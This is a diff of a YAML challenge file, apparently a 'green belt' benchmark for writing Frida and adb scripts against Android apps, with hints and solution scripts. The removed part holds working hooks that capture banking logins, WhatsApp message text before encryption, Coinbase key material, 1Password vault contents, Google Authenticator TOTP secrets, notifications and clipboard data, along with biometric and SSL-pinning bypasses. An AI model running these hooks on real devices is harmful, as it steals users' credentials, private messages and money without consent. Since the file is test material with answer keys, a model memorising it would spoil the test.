@@ -1,1050 +1,2211 @@
-# Green Belt Challenges
-# Purpose: Dynamic Instrumentation and Runtime Analysis
-# Focus: Using Frida to intercept, modify, and analyze app behavior in real-time
-
 challenges:
-  # Challenge 1: Process Verification (Placeholder already exists but let's formalize)
-  - id: green_001
-    name: "Frida Runtime Check"
-    description: |
-      Write a basic Frida script that prints "Frida is active" to the console 
-      and then exits. Use this to verify the runtime environment.
-    belt: green
-    difficulty: 1
-    script_type: frida
-
-    inputs:
-      target_class: "com.genymotion.settings"
-      device_context:
-        task: "verify frida connectivity"
-
-    validation:
-      type: output_contains
-      expected: "Frida is active"
-
-    hints:
-      - "Use console.log() for output"
-      - "The script should be pure JavaScript"
-
-    kata_solution: "console.log('Frida is active');"
-
-    tags:
-      - frida
-      - verification
-
-  # Challenge 2: Class Enumeration
-  - id: green_002
-    name: "Class & Method Enumeration"
-    description: |
-      Write a Frida script that enumerates all loaded classes in the 
-      target process and prints their names to the console.
-    belt: green
-    difficulty: 2
-    script_type: frida
-
-    inputs:
-      target_class: "com.genymotion.settings"
-      device_context:
-        task: "enumerate loaded classes"
-
-    validation:
-      type: output_contains
-      expected: "java.lang.String"
-
-    hints:
-      - "Use Java.enumerateLoadedClasses() logic"
-      - "Iterate through the array and log each class name"
-
-    kata_solution: |
-      Java.perform(function() {
-          Java.enumerateLoadedClasses({
-              onMatch: function(className) {
-                  console.log(className);
-              },
-              onComplete: function() {
-                  console.log("Enumeration complete");
-              }
-          });
-      });
-
-    tags:
-      - reconnaissance
-      - frida
-      - enumeration
-
-  # Challenge 3: API Hooking (Logging)
-  - id: green_003
-    name: "System Log Interception"
-    description: |
-      Write a Frida script that hooks the android.util.Log.d method 
-      and prints every log message to the Frida console.
-    belt: green
-    difficulty: 3
-    script_type: frida
-
-    inputs:
-      target_class: "android.util.Log"
-      device_context:
-        task: "intercept debug logs"
-
-    validation:
-      type: regex_match
-      pattern: "\\.implementation = function"
-
-    hints:
-      - "Use Java.use('android.util.Log')"
-      - "Overwrite the .d.implementation function"
-      - "Remember to call the original method if you want logs to still appear in logcat"
-
-    kata_solution: |
-      Java.perform(function() {
-          var Log = Java.use("android.util.Log");
-          Log.d.overload("java.lang.String", "java.lang.String").implementation = function(tag, msg) {
-              console.log("[INTERCEPTED] Tag: " + tag + " Message: " + msg);
-              return this.d(tag, msg);
-          };
-      });
-
-    tags:
-      - frida
-      - hooking
-      - logging
-
-  # Challenge 4: Root Detection Bypass
-  - id: green_004
-    name: "Root Detection Logic Bypass"
-    description: |
-      An app has a method 'checkRoot' in class 'com.security.check' that 
-      returns 'true' if the device is rooted. Write a Frida script to 
-      force this method to always return 'false'.
-    belt: green
-    difficulty: 4
-    script_type: frida
-
-    inputs:
-      target_class: "com.security.check"
-      device_context:
-        task: "bypass root check"
-
-    validation:
-      type: output_contains
-      expected: "return false"
-
-    hints:
-      - "Hook the specific method implementation"
-      - "Ignore the original logic and simply return false"
-
-    kata_solution: |
-      Java.perform(function() {
-          var RootCheck = Java.use("com.security.check");
-          RootCheck.checkRoot.implementation = function() {
-              console.log("Bypassing root check...");
-              return false;
-          };
-      });
-
-    tags:
-      - frida
-      - bypass
-      - root-detection
-
-  # Challenge 5: Native Function Interception
-  - id: green_005
-    name: "Native File Open Interception"
-    description: |
-      Write a Frida script that hooks the native 'open' function in 
-      libc.so and logs the name of every file the process attempts to open.
-    belt: green
-    difficulty: 5
-    script_type: frida
-
-    inputs:
-      target_class: "libc.so"
-      device_context:
-        task: "monitor native file access"
-
-    validation:
-      type: output_contains
-      expected: "Interceptor.attach"
-
-    hints:
-      - "Use Module.findExportByName(null, 'open')"
-      - "Use Interceptor.attach with onEnter callback"
-      - "The first argument (args[0]) is the path string"
-
-    kata_solution: |
-      var openPtr = Module.findExportByName(null, 'open');
-      Interceptor.attach(openPtr, {
-          onEnter: function(args) {
-              var path = Memory.readUtf8String(args[0]);
-              console.log("[OPEN] File: " + path);
-          }
-      });
-
-    tags:
-      - frida
-      - native
-      - interceptor
-
-  # =============================================================================
-  # PERSONA-AWARE APP TARGETING CHALLENGES
-  # =============================================================================
-  # These challenges target specific apps from the device persona
-
-  # Challenge 6: Banking App Credential Hooking
-  - id: green_persona_001
-    name: "Banking App Login Hook"
-    description: |
-      The target device has Chase Mobile installed (com.chase.sig.android).
-      Write a Frida script that hooks the login flow to capture credentials
-      when the user authenticates. Focus on intercepting the authentication
-      method that processes username and password.
-    belt: green
-    difficulty: 5
-    script_type: frida
-    compatibility: universal
-
-    persona_requirements:
-      required_apps:
-        - com.chase.sig.android
-
-    inputs:
-      target_package: "com.chase.sig.android"
-      device_context:
-        task: "intercept banking credentials"
-        target_app: "Chase Mobile"
-
-    validation:
-      type: regex_match
-      pattern: "Java\\.use.*implementation.*function"
-
-    hints:
-      - "First enumerate classes to find authentication-related methods"
-      - "Look for methods with 'login', 'auth', or 'credential' in the name"
-      - "Hook String parameters passed to authentication methods"
-      - "Use Java.choose() to find existing instances if needed"
-
-    kata_solution: |
-      Java.perform(function() {
-          // Generic pattern for credential interception
-          Java.enumerateLoadedClasses({
-              onMatch: function(className) {
-                  if (className.toLowerCase().includes("login") ||
-                      className.toLowerCase().includes("auth")) {
-                      console.log("[TARGET] Found class: " + className);
-                  }
-              },
-              onComplete: function() {}
-          });
-
-          // Hook common authentication patterns
-          try {
-              var LoginActivity = Java.use("com.chase.sig.android.activity.LoginActivity");
-              LoginActivity.doLogin.implementation = function(username, password) {
-                  console.log("[CAPTURED] Username: " + username);
-                  console.log("[CAPTURED] Password: " + password);
-                  return this.doLogin(username, password);
-              };
-          } catch(e) {
-              console.log("Searching for alternative auth methods...");
-          }
-      });
-
-    tags:
-      - frida
-      - credential-theft
-      - banking
-      - persona-required
-
-  # Challenge 7: Messaging App Message Interception
-  - id: green_persona_002
-    name: "WhatsApp Message Interception"
-    description: |
-      The device has WhatsApp installed. Write a Frida script that hooks
-      WhatsApp's message handling to intercept outgoing messages before
-      they're encrypted and sent. Log the recipient and message content.
-    belt: green
-    difficulty: 5
-    script_type: frida
-    compatibility: universal
-
-    persona_requirements:
-      required_apps:
-        - com.whatsapp
-
-    inputs:
-      target_package: "com.whatsapp"
-      device_context:
-        task: "intercept messaging content"
-        target_app: "WhatsApp"
-
-    validation:
-      type: output_contains
-      expected: "Java.perform"
-
-    hints:
-      - "WhatsApp uses end-to-end encryption, but messages exist in plaintext before encryption"
-      - "Look for message composition or send methods"
-      - "The Message class likely has getText() or similar methods"
-      - "Hook at the UI layer before encryption occurs"
-
-    kata_solution: |
-      Java.perform(function() {
-          // Hook message sending at UI layer
-          try {
-              var MessageSender = Java.use("com.whatsapp.messaging.MessageSender");
-              MessageSender.sendTextMessage.implementation = function(recipient, message) {
-                  console.log("[INTERCEPTED] To: " + recipient);
-                  console.log("[INTERCEPTED] Message: " + message);
-                  return this.sendTextMessage(recipient, message);
-              };
-          } catch(e) {
-              console.log("Trying alternative hook point...");
-          }
-
-          // Alternative: Hook at EditText level
-          var EditText = Java.use("android.widget.EditText");
-          EditText.getText.implementation = function() {
-              var text = this.getText();
-              console.log("[INPUT] " + text.toString());
-              return text;
-          };
-      });
-
-    tags:
-      - frida
-      - message-interception
-      - e2e-bypass
-      - persona-required
-
-  # Challenge 8: Cryptocurrency Wallet Key Extraction
-  - id: green_persona_003
-    name: "Crypto Wallet Key Extraction"
-    description: |
-      The device has Coinbase installed (com.coinbase.android). Write a
-      Frida script that attempts to extract wallet keys or seed phrases
-      by hooking cryptographic operations and key management classes.
-    belt: green
-    difficulty: 5
-    script_type: frida
-    compatibility: android_14
-
-    persona_requirements:
-      required_apps:
-        - com.coinbase.android
-
-    inputs:
-      target_package: "com.coinbase.android"
-      device_context:
-        task: "extract cryptocurrency keys"
-        target_app: "Coinbase"
-
-    validation:
-      type: regex_match
-      pattern: "(SecretKey|PrivateKey|KeyPair|seed|mnemonic)"
-
-    hints:
-      - "Look for java.security.KeyStore operations"
-      - "Hook SecretKeySpec constructor to capture key material"
-      - "Seed phrases are often stored as String arrays"
-      - "Check for BIP39 mnemonic generation methods"
-
-    kata_solution: |
-      Java.perform(function() {
-          // Hook KeyStore operations
-          var KeyStore = Java.use("java.security.KeyStore");
-          KeyStore.getKey.implementation = function(alias, password) {
-              console.log("[KEYSTORE] Alias: " + alias);
-              var key = this.getKey(alias, password);
-              if (key != null) {
-                  console.log("[KEYSTORE] Key retrieved!");
-              }
-              return key;
-          };
-
-          // Hook SecretKeySpec for symmetric keys
-          var SecretKeySpec = Java.use("javax.crypto.spec.SecretKeySpec");
-          SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(key, algo) {
-              console.log("[SECRET KEY] Algorithm: " + algo);
-              console.log("[SECRET KEY] Key bytes: " + bytesToHex(key));
-              return this.$init(key, algo);
-          };
-
-          function bytesToHex(bytes) {
-              var hex = [];
-              for (var i = 0; i < bytes.length; i++) {
-                  hex.push(('0' + (bytes[i] & 0xFF).toString(16)).slice(-2));
-              }
-              return hex.join('');
-          }
-      });
-
-    tags:
-      - frida
-      - crypto-theft
-      - key-extraction
-      - persona-required
-
-  # Challenge 9: Password Manager Vault Access
-  - id: green_persona_004
-    name: "Password Manager Vault Hook"
-    description: |
-      The device has 1Password installed (com.onepassword.android). Write
-      a Frida script that hooks the vault decryption process to capture
-      the master password or extract decrypted credentials as they're used.
-    belt: green
-    difficulty: 5
-    script_type: frida
-    compatibility: android_14
-
-    persona_requirements:
-      required_apps:
-        - com.onepassword.android
-
-    inputs:
-      target_package: "com.onepassword.android"
-      device_context:
-        task: "extract password vault contents"
-        target_app: "1Password"
-
-    validation:
-      type: output_contains
-      expected: "implementation"
-
-    hints:
-      - "Hook the unlock/decrypt method that takes the master password"
-      - "Look for Cipher.doFinal() calls during decryption"
-      - "Credential filling methods expose plaintext passwords"
-      - "The autofill service is a good hook point"
-
-    kata_solution: |
-      Java.perform(function() {
-          // Hook master password entry
-          var EditText = Java.use("android.widget.EditText");
-
-          // Hook Cipher operations
-          var Cipher = Java.use("javax.crypto.Cipher");
-          Cipher.doFinal.overload('[B').implementation = function(input) {
-              var result = this.doFinal(input);
-              console.log("[CIPHER] Decrypted data length: " + result.length);
-              try {
-                  var str = Java.use("java.lang.String").$new(result, "UTF-8");
-                  console.log("[DECRYPTED] " + str.substring(0, Math.min(100, str.length())));
-              } catch(e) {}
-              return result;
-          };
-
-          // Hook autofill credential retrieval
-          try {
-              var CredentialProvider = Java.use("com.onepassword.android.autofill.CredentialProvider");
-              CredentialProvider.getCredential.implementation = function(id) {
-                  var cred = this.getCredential(id);
-                  console.log("[CREDENTIAL] ID: " + id);
-                  console.log("[CREDENTIAL] Username: " + cred.getUsername());
-                  console.log("[CREDENTIAL] Password: " + cred.getPassword());
-                  return cred;
-              };
-          } catch(e) {}
-      });
-
-    tags:
-      - frida
-      - password-theft
-      - vault-bypass
-      - persona-required
-
-  # Challenge 10: 2FA Token Extraction
-  - id: green_persona_005
-    name: "Authenticator TOTP Extraction"
-    description: |
-      The device has Google Authenticator installed. Write a Frida script
-      that extracts the TOTP secrets used to generate 2FA codes, allowing
-      code generation without access to the app.
-    belt: green
-    difficulty: 5
-    script_type: frida
-    compatibility: universal
-
-    persona_requirements:
-      required_apps:
-        - com.google.android.apps.authenticator2
-
-    inputs:
-      target_package: "com.google.android.apps.authenticator2"
-      device_context:
-        task: "extract 2FA secrets"
-        target_app: "Google Authenticator"
-
-    validation:
-      type: regex_match
-      pattern: "(TOTP|secret|generateCode|OTP)"
-
-    hints:
-      - "TOTP secrets are Base32-encoded strings"
-      - "Look for database operations storing account info"
-      - "The code generation method takes the secret as input"
-      - "SQLite database may contain the secrets"
-
-    kata_solution: |
-      Java.perform(function() {
-          // Hook TOTP generation
-          try {
-              var OtpProvider = Java.use("com.google.android.apps.authenticator2.otp.OtpProvider");
-              OtpProvider.getNextCode.implementation = function(secret) {
-                  console.log("[TOTP SECRET] " + secret);
-                  return this.getNextCode(secret);
-              };
-          } catch(e) {}
-
-          // Hook database queries for stored secrets
-          var SQLiteDatabase = Java.use("android.database.sqlite.SQLiteDatabase");
-          SQLiteDatabase.rawQuery.implementation = function(sql, args) {
-              console.log("[SQL] " + sql);
-              if (sql.toLowerCase().includes("accounts") ||
-                  sql.toLowerCase().includes("secret")) {
-                  console.log("[POTENTIAL SECRET QUERY]");
-              }
-              return this.rawQuery(sql, args);
-          };
-      });
-
-    tags:
-      - frida
-      - 2fa-bypass
-      - totp-extraction
-      - persona-required
-
-  # Challenge 11: Biometric Bypass
-  - id: green_persona_006
-    name: "Biometric Authentication Bypass"
-    description: |
-      Many apps on the device use biometric authentication (fingerprint).
-      Write a Frida script that bypasses biometric checks by hooking the
-      BiometricPrompt callback and forcing successful authentication.
-    belt: green
-    difficulty: 4
-    script_type: frida
-    compatibility: universal
-
-    inputs:
-      device_context:
-        task: "bypass biometric authentication"
-
-    validation:
-      type: output_contains
-      expected: "BiometricPrompt"
-
-    hints:
-      - "Hook BiometricPrompt.AuthenticationCallback"
-      - "Force onAuthenticationSucceeded to be called"
-      - "You may need to create a fake AuthenticationResult"
-      - "Some apps also check FingerprintManager (deprecated API)"
-
-    kata_solution: |
-      Java.perform(function() {
-          var BiometricPrompt = Java.use("android.hardware.biometrics.BiometricPrompt");
-          var AuthCallback = Java.use("android.hardware.biometrics.BiometricPrompt$AuthenticationCallback");
-
-          AuthCallback.onAuthenticationFailed.implementation = function() {
-              console.log("[BIOMETRIC] Failed attempt intercepted");
-              // Don't call original - suppress failure
-          };
-
-          // Force success on any authentication attempt
-          BiometricPrompt.authenticate.overload(
-              'android.os.CancellationSignal',
-              'java.util.concurrent.Executor',
-              'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'
-          ).implementation = function(cancel, executor, callback) {
-              console.log("[BIOMETRIC] Authentication requested - forcing success");
-
-              // Create fake success result
-              var AuthResult = Java.use("android.hardware.biometrics.BiometricPrompt$AuthenticationResult");
-              var fakeResult = AuthResult.$new();
-
-              callback.onAuthenticationSucceeded(fakeResult);
-          };
-      });
-
-    tags:
-      - frida
-      - biometric-bypass
-      - authentication
-      - persona-required
-
-  # Challenge 12: SSL Pinning Bypass
-  - id: green_persona_007
-    name: "SSL Certificate Pinning Bypass"
-    description: |
-      Banking and financial apps (Chase, Coinbase) use SSL pinning to
-      prevent traffic interception. Write a Frida script that bypasses
-      SSL pinning to allow MITM analysis of HTTPS traffic.
-    belt: green
-    difficulty: 4
-    script_type: frida
-    compatibility: universal
-
-    inputs:
-      device_context:
-        task: "bypass SSL certificate pinning"
-        target_apps:
-          - "com.chase.sig.android"
-          - "com.coinbase.android"
-
-    validation:
-      type: regex_match
-      pattern: "(TrustManager|checkServerTrusted|SSLContext)"
-
-    hints:
-      - "Hook X509TrustManager.checkServerTrusted"
-      - "Make it accept any certificate chain"
-      - "Also hook OkHttp's CertificatePinner if used"
-      - "Some apps use custom pinning implementations"
-
-    kata_solution: |
-      Java.perform(function() {
-          // Bypass standard TrustManager
-          var TrustManager = Java.use("javax.net.ssl.X509TrustManager");
-          var SSLContext = Java.use("javax.net.ssl.SSLContext");
-
-          var TrustManagerImpl = Java.registerClass({
-              name: 'com.bypass.TrustManager',
-              implements: [TrustManager],
-              methods: {
-                  checkClientTrusted: function(chain, authType) {},
-                  checkServerTrusted: function(chain, authType) {
-                      console.log("[SSL BYPASS] Accepting certificate for: " + authType);
-                  },
-                  getAcceptedIssuers: function() { return []; }
-              }
-          });
-
-          // Install our TrustManager
-          var context = SSLContext.getInstance("TLS");
-          context.init(null, [TrustManagerImpl.$new()], null);
-          SSLContext.setDefault(context);
-
-          // Bypass OkHttp pinning
-          try {
-              var CertPinner = Java.use("okhttp3.CertificatePinner");
-              CertPinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, certs) {
-                  console.log("[OKHTTP] Bypassing pin for: " + hostname);
-                  return;
-              };
-          } catch(e) {}
-
-          console.log("[SSL] Pinning bypass installed");
-      });
-
-    tags:
-      - frida
-      - ssl-bypass
-      - mitm
-      - persona-required
-
-  # Challenge 13: App-Specific Data Extraction
-  - id: green_persona_008
-    name: "Chat App Database Extraction"
-    description: |
-      WhatsApp and Telegram store messages in encrypted SQLite databases.
-      Write a Frida script that hooks database operations to extract
-      decrypted message content as the app reads them.
-    belt: green
-    difficulty: 5
-    script_type: frida
-    compatibility: universal
-
-    persona_requirements:
-      required_apps:
-        - com.whatsapp
-
-    inputs:
-      target_package: "com.whatsapp"
-      device_context:
-        task: "extract messaging database content"
-        target_app: "WhatsApp"
-
-    validation:
-      type: output_contains
-      expected: "SQLite"
-
-    hints:
-      - "Hook SQLiteCursor to capture query results"
-      - "WhatsApp's msgstore.db contains all messages"
-      - "Messages are decrypted when loaded into memory"
-      - "Hook getString() on Cursor to capture text columns"
-
-    kata_solution: |
-      Java.perform(function() {
-          var Cursor = Java.use("android.database.Cursor");
-          var SQLiteCursor = Java.use("android.database.sqlite.SQLiteCursor");
-
-          // Hook getString to capture message content
-          Cursor.getString.implementation = function(columnIndex) {
-              var value = this.getString(columnIndex);
-              var colName = this.getColumnName(columnIndex);
-
-              // Look for message-related columns
-              if (colName && (colName.includes("data") ||
-                             colName.includes("text") ||
-                             colName.includes("body"))) {
-                  console.log("[DB] Column: " + colName + " = " + value);
-              }
-              return value;
-          };
-
-          // Hook rawQuery to see what's being queried
-          var SQLiteDatabase = Java.use("android.database.sqlite.SQLiteDatabase");
-          SQLiteDatabase.rawQuery.implementation = function(sql, args) {
-              if (sql.toLowerCase().includes("message")) {
-                  console.log("[SQL] Message query: " + sql);
-              }
-              return this.rawQuery(sql, args);
-          };
-      });
-
-    tags:
-      - frida
-      - database-extraction
-      - message-theft
-      - persona-required
-
-  # Challenge 14: Notification Content Interception
-  - id: green_persona_009
-    name: "Notification Content Theft"
-    description: |
-      Many sensitive items arrive via notifications (2FA codes, bank alerts).
-      Write a Frida script that intercepts all notifications as they're
-      posted, extracting the title and content text.
-    belt: green
-    difficulty: 3
-    script_type: frida
-    compatibility: universal
-
-    inputs:
-      device_context:
-        task: "intercept notification content"
-
-    validation:
-      type: output_contains
-      expected: "NotificationManager"
-
-    hints:
-      - "Hook NotificationManager.notify()"
-      - "Extract text from Notification.extras Bundle"
-      - "Keys: EXTRA_TITLE, EXTRA_TEXT, EXTRA_BIG_TEXT"
-      - "2FA codes often come as high-priority notifications"
-
-    kata_solution: |
-      Java.perform(function() {
-          var NotificationManager = Java.use("android.app.NotificationManager");
-          var Notification = Java.use("android.app.Notification");
-
-          NotificationManager.notify.overload('int', 'android.app.Notification').implementation = function(id, notification) {
-              console.log("[NOTIFICATION] ID: " + id);
-
-              var extras = notification.extras.value;
-              var title = extras.getString("android.title");
-              var text = extras.getString("android.text");
-              var bigText = extras.getString("android.bigText");
-
-              console.log("[NOTIFICATION] Title: " + title);
-              console.log("[NOTIFICATION] Text: " + text);
-              if (bigText) console.log("[NOTIFICATION] BigText: " + bigText);
-
-              // Check for 2FA codes
-              var fullText = (text || "") + (bigText || "");
-              if (fullText.match(/\d{6}/) || fullText.toLowerCase().includes("code")) {
-                  console.log("[2FA DETECTED] Potential verification code!");
-              }
-
-              return this.notify(id, notification);
-          };
-      });
-
-    tags:
-      - frida
-      - notification-interception
-      - 2fa-theft
-      - persona-required
-
-  # Challenge 15: Clipboard Monitoring
-  - id: green_persona_010
-    name: "Real-time Clipboard Monitoring"
-    description: |
-      Users often copy sensitive data (passwords, crypto addresses).
-      Write a Frida script that monitors the system clipboard and logs
-      everything that's copied, looking for high-value data patterns.
-    belt: green
-    difficulty: 3
-    script_type: frida
-    compatibility: universal
-
-    inputs:
-      device_context:
-        task: "monitor clipboard for sensitive data"
-
-    validation:
-      type: output_contains
-      expected: "ClipboardManager"
-
-    hints:
-      - "Hook ClipboardManager.setPrimaryClip()"
-      - "Extract text from ClipData items"
-      - "Look for patterns: crypto addresses, passwords, SSNs"
-      - "Also hook getText() for reading clipboard"
-
-    kata_solution: |
-      Java.perform(function() {
-          var ClipboardManager = Java.use("android.content.ClipboardManager");
-          var ClipData = Java.use("android.content.ClipData");
-
-          // Hook clipboard write
-          ClipboardManager.setPrimaryClip.implementation = function(clip) {
-              console.log("[CLIPBOARD] New content copied");
-
-              for (var i = 0; i < clip.getItemCount(); i++) {
-                  var item = clip.getItemAt(i);
-                  var text = item.getText();
-                  if (text) {
-                      console.log("[CLIPBOARD] Content: " + text);
-
-                      // Pattern matching for sensitive data
-                      var str = text.toString();
-                      if (str.match(/^0x[a-fA-F0-9]{40}$/)) {
-                          console.log("[ALERT] Ethereum address detected!");
-                      }
-                      if (str.match(/^\d{3}-\d{2}-\d{4}$/)) {
-                          console.log("[ALERT] SSN pattern detected!");
-                      }
-                      if (str.match(/^[A-Za-z0-9+/]{20,}={0,2}$/)) {
-                          console.log("[ALERT] Possible API key/token!");
-                      }
-                  }
-              }
-
-              return this.setPrimaryClip(clip);
-          };
-      });
-
-    tags:
-      - frida
-      - clipboard-monitor
-      - data-theft
-      - persona-required
-
-  # =============================================================================
-  # OVERLAY & TAPJACKING ATTACKS
-  # =============================================================================
-
-  # Challenge 16: Overlay Attack Demonstration
-  - id: green_overlay_001
-    name: "Overlay Attack - Screen Hijacking"
-    description: |
-      Demonstrate an overlay attack that can capture user input by placing
-      a transparent or deceptive window over legitimate app UI.
-
-      OBJECTIVE:
-      1. Check overlay permission status on target device
-      2. Enumerate apps with SYSTEM_ALERT_WINDOW permission
-      3. Demonstrate overlay attack surface via ADB commands
-      4. Simulate the attack flow for credential capture
-
-      This demonstrates how malicious apps can steal credentials by
-      overlaying fake login screens on banking/financial apps.
-    belt: green
-    difficulty: 4
-    script_type: adb
-    compatibility: universal
-
-    exploitation_complexity:
-      rating: 3
-      rationale: "Well-documented attack vector, requires understanding Android window system"
-      required_skills:
-        - android_permissions
-        - window_manager
-        - adb_shell_commands
-      steps_required: 4
-      tools_needed: [adb]
-
-    inputs:
-      device_context:
-        task: "demonstrate overlay attack surface"
-        target_apps:
-          - com.chase.sig.android
-          - com.coinbase.android
-
-    validation:
-      type: output_contains
-      expected: "SYSTEM_ALERT_WINDOW"
-
-    hints:
-      - "Check permission: adb shell appops get <pkg> SYSTEM_ALERT_WINDOW"
-      - "List all apps with overlay: dumpsys window | grep mOverlayWindow"
-      - "Overlay permission is required for draw-over-apps"
-      - "Modern Android (10+) restricts overlay on sensitive apps"
-
-    kata_solution: |
-      # Check for apps with overlay permission
-      adb shell appops query-op SYSTEM_ALERT_WINDOW allow
-
-      # Check specific security-sensitive app
-      adb shell appops get com.android.settings SYSTEM_ALERT_WINDOW
-
-      # List window overlay state
-      adb shell dumpsys window windows | grep -E "mOverlay|SYSTEM_ALERT"
-
-      echo "SYSTEM_ALERT_WINDOW analysis complete"
-
-    tags:
-      - overlay
-      - tapjacking
-      - credential-theft
-      - attack-surface
-
-  # Challenge 17: Crypto Address Clipper
-  - id: green_clipper_002
-    name: "Cryptocurrency Address Clipper"
-    description: |
-      Write a Frida script that monitors the clipboard for cryptocurrency
-      wallet addresses and demonstrates how a clipper malware could
-      replace them with attacker-controlled addresses.
-
-      OBJECTIVE:
-      1. Hook ClipboardManager to monitor clipboard changes
-      2. Detect cryptocurrency address patterns (ETH, BTC)
-      3. Log detected addresses
-      4. Demonstrate replacement capability (logging only, don't modify)
-
-      Pattern matching:
-      - ETH: 0x followed by 40 hex characters
-      - BTC: 1, 3, or bc1 prefix with 25-34 characters
-    belt: green
-    difficulty: 4
-    script_type: frida
-    compatibility: universal
-
-    exploitation_complexity:
-      rating: 3
-      rationale: "Standard clipboard hooking with regex pattern matching"
-      required_skills:
-        - frida_java_hooking
-        - clipboard_api
-        - regex_patterns
-      steps_required: 4
-      tools_needed: [frida]
-
-    inputs:
-      device_context:
-        task: "implement clipboard monitoring for crypto addresses"
-
-    validation:
-      type: regex_match
-      pattern: "(ClipboardManager|setPrimaryClip|0x[a-fA-F0-9]|bc1)"
-
-    hints:
-      - "Hook android.content.ClipboardManager"
-      - "Both setPrimaryClip and getPrimaryClip are useful"
-      - "Use regex to match ETH addresses: /^0x[a-fA-F0-9]{40}$/"
-      - "BTC addresses start with 1, 3, or bc1"
-
-    kata_solution: |
-      Java.perform(function() {
-          var ClipboardManager = Java.use("android.content.ClipboardManager");
-
-          ClipboardManager.setPrimaryClip.implementation = function(clip) {
-              var text = clip.getItemAt(0).getText();
-              if (text != null) {
-                  var str = text.toString();
-                  console.log("[CLIPBOARD] Content: " + str);
-
-                  // Check for Ethereum address
-                  if (str.match(/^0x[a-fA-F0-9]{40}$/)) {
-                      console.log("[CLIPPER] ETH address detected!");
-                      console.log("[CLIPPER] Would replace with attacker wallet");
-                  }
-
-                  // Check for Bitcoin address
-                  if (str.match(/^(1|3|bc1)[a-zA-Z0-9]{25,39}$/)) {
-                      console.log("[CLIPPER] BTC address detected!");
-                      console.log("[CLIPPER] Would replace with attacker wallet");
-                  }
-              }
-              return this.setPrimaryClip(clip);
-          };
-
-          console.log("[+] Crypto clipper monitoring active");
-      });
-
-    tags:
-      - frida
-      - clipper
-      - crypto-theft
-      - clipboard
-
-  # Challenge 18: Accessibility Service Abuse
-  - id: green_accessibility_001
-    name: "Accessibility Service Attack Surface"
-    description: |
-      Analyze the attack surface of Android accessibility services.
-      Accessibility services are frequently abused by malware to:
-      - Read screen content
-      - Perform automated clicks
-      - Capture credentials
-      - Bypass security prompts
-
-      OBJECTIVE:
-      1. List enabled accessibility services
-      2. Check accessibility service permissions
-      3. Demonstrate how accessibility can read screen content
-      4. Document the attack vectors
-    belt: green
-    difficulty: 3
-    script_type: adb
-    compatibility: universal
-
-    exploitation_complexity:
-      rating: 2
-      rationale: "Well-documented abuse vector with ADB enumeration"
-      required_skills:
-        - adb_commands
-        - accessibility_api
-        - android_permissions
-      steps_required: 3
-      tools_needed: [adb]
-
-    inputs:
-      device_context:
-        task: "analyze accessibility service attack surface"
-
-    validation:
-      type: output_contains
-      expected: "accessibility"
-
-    hints:
-      - "Settings: secure enabled_accessibility_services"
-      - "Use dumpsys accessibility for detailed info"
-      - "Check which apps have AccessibilityService declared"
-      - "Accessibility can see all UI content including passwords"
-
-    kata_solution: |
-      # List enabled accessibility services
-      adb shell settings get secure enabled_accessibility_services
-
-      # Get detailed accessibility state
-      adb shell dumpsys accessibility
-
-      # Find apps with accessibility service declared
-      adb shell pm list packages -f | while read pkg; do
-        name=$(echo $pkg | cut -d'=' -f2)
-        adb shell dumpsys package $name | grep -q "android.accessibilityservice" && echo "ACCESSIBILITY: $name"
-      done
-
-      echo "[+] Accessibility analysis complete"
-
-    tags:
-      - accessibility
-      - attack-surface
-      - screen-reader
-      - automation
-
+- id: green_001
+  name: Frida Runtime Check
+  description: "Write a basic Frida script that prints \"Frida is active\" to the console \nand then exits. Use this to verify\
+    \ the runtime environment.\n"
+  belt: green
+  difficulty: 1
+  script_type: frida
+  inputs:
+    target_class: com.genymotion.settings
+    device_context:
+      task: verify frida connectivity
+  validation:
+    type: output_contains
+    expected: Frida is active
+  hints:
+  - Use console.log() for output
+  - The script should be pure JavaScript
+  kata_solution: console.log('Frida is active');
+  tags:
+  - frida
+  - verification
+- id: green_002
+  name: Class & Method Enumeration
+  description: "Write a Frida script that enumerates all loaded classes in the \ntarget process and prints their names to\
+    \ the console.\n"
+  belt: green
+  difficulty: 2
+  script_type: frida
+  inputs:
+    target_class: com.genymotion.settings
+    device_context:
+      task: enumerate loaded classes
+  validation:
+    type: output_contains
+    expected: java.lang.String
+  hints:
+  - Use Java.enumerateLoadedClasses() logic
+  - Iterate through the array and log each class name
+  kata_solution: "Java.perform(function() {\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n \
+    \           console.log(className);\n        },\n        onComplete: function() {\n            console.log(\"Enumeration\
+    \ complete\");\n        }\n    });\n});\n"
+  tags:
+  - reconnaissance
+  - frida
+  - enumeration
+- id: green_003
+  name: System Log Interception
+  description: "Write a Frida script that hooks the android.util.Log.d method \nand prints every log message to the Frida\
+    \ console.\n"
+  belt: green
+  difficulty: 3
+  script_type: frida
+  inputs:
+    target_class: android.util.Log
+    device_context:
+      task: intercept debug logs
+  validation:
+    type: regex_match
+    pattern: \.implementation = function
+  hints:
+  - Use Java.use('android.util.Log')
+  - Overwrite the .d.implementation function
+  - Remember to call the original method if you want logs to still appear in logcat
+  kata_solution: "Java.perform(function() {\n    var Log = Java.use(\"android.util.Log\");\n    Log.d.overload(\"java.lang.String\"\
+    , \"java.lang.String\").implementation = function(tag, msg) {\n        console.log(\"[INTERCEPTED] Tag: \" + tag + \"\
+    \ Message: \" + msg);\n        return this.d(tag, msg);\n    };\n});\n"
+  tags:
+  - frida
+  - hooking
+  - logging
+- id: green_004
+  name: Root Detection Logic Bypass
+  description: "An app has a method 'checkRoot' in class 'com.security.check' that \nreturns 'true' if the device is rooted.\
+    \ Write a Frida script to \nforce this method to always return 'false'.\n"
+  belt: green
+  difficulty: 4
+  script_type: frida
+  inputs:
+    target_class: com.security.check
+    device_context:
+      task: bypass root check
+  validation:
+    type: output_contains
+    expected: return false
+  hints:
+  - Hook the specific method implementation
+  - Ignore the original logic and simply return false
+  kata_solution: "Java.perform(function() {\n    var RootCheck = Java.use(\"com.security.check\");\n    RootCheck.checkRoot.implementation\
+    \ = function() {\n        console.log(\"Bypassing root check...\");\n        return false;\n    };\n});\n"
+  tags:
+  - frida
+  - bypass
+  - root-detection
+- id: green_005
+  name: Native File Open Interception
+  description: "Write a Frida script that hooks the native 'open' function in \nlibc.so and logs the name of every file the\
+    \ process attempts to open.\n"
+  belt: green
+  difficulty: 5
+  script_type: frida
+  inputs:
+    target_class: libc.so
+    device_context:
+      task: monitor native file access
+  validation:
+    type: output_contains
+    expected: Interceptor.attach
